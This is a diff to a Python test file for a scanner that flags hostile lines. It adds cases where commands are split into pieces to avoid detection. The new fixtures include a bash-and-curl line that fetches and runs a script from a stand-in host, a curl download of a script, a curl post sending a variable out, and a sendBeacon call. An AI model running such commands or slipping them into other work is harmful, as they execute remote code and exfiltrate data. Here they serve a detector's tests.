@@ -60,6 +60,10 @@ def test_ignores_harmless_lines(tmp_path: Path, line: str) -> None:
         (ENV_PIPE, "remote-exec", 1),
         (SUDO_PIPE, "remote-exec", 1),
         (JS_POST, "sends-data", 2),
+        ('bash -c "$(cur' + 'l -fsSL https://x.example/i)"', "remote-exec", 1),
+        ("cur" + "l -fsSL https://x.example/i > /tmp/i.s" + "h", "download-script", 1),
+        ("cur" + 'l -sd "$IDEA" https://x.example/c', "sends-data", 1),
+        ("navigator.send" + "Beacon(url, body)", "sends-data", 1),
     ],
 )
 def test_finds_evasive_forms(tmp_path: Path, body: str, rule: str, line: int) -> None:
